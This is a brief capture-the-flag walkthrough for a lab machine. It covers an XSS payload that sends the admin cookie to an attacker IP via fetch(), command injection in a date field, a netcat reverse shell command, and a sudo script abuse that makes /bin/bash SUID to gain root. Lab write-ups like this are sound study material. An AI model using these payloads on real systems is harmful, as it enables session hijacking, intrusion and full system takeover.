
nmap:
	22, 5000tcp

Access the site using `<siteIP>:5000`



```
Xss on user-agent field as well as on the message field on /support:
<img src=x onerror=fetch('http://<kaliTun0ip>'+document.cookie);>
```
Using this we will get the admin user cookie and then paste this cookie on the `/dashboard` endpoint .

---

**Dashboard ENUM**
--
There is a date filed, captured using burp. Inserting `;id` or `| id` in the date field confirms it for a command injection vuln. We can run other commands such as `ls,whoami,pwd`.

Time for a reverse shell.

In the date parameter , enter this , open up a listener beforehand lol:

date=`; nc 10.10.14.33 6666 -e /bin/bash`


After getting shell back, we can see the userflag.

---

**PRIV ESC**:

`sudo -l` will reveal info, cat the said service.

You can see details of a .sh file that is needed to be present, and it is ran.
So we can make our malicious .sh file and launch it and get root that way.

```
echo "chmod u+s /bin/bash" > initdb.sh
chmod +x initdb.sh to make it executable
```

then we run it as normal :
`sudo syscheck`
then 
`/bin/bash -p` to spawn a root bash shell.

pwnd! 
